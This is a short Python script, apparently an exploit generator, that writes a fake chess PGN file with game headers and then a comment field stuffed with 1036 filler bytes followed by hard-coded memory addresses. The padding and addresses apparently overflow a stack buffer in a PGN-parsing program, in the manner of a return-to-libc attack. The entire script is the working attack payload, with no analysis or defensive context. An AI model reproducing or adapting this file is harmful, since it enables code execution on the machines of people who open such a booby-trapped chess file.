f=open("dummy.pgn","w+")
f.write("[Event \"State Ch.\"]\n")
f.write("[White \"Capablanca\"]\n")
f.write("[Black \"Jaffe\"]\n")
f.write("[Result \"1-0\"]\n")
f.write("[Board \"4r3/6P1/2p2P1k/1p6/pP2p1R1/P1B5/2P2K2/3r4\"]\n")
f.write("[CommentSTX]\n")
f.write("\x41"*1036)
f.write("\x10\x33\xe5\xb7")
f.write("\x41"*4)
f.write("\x4c\x5d\xf7\xb7")
f.write("\n")
f.write("[CommentEND]")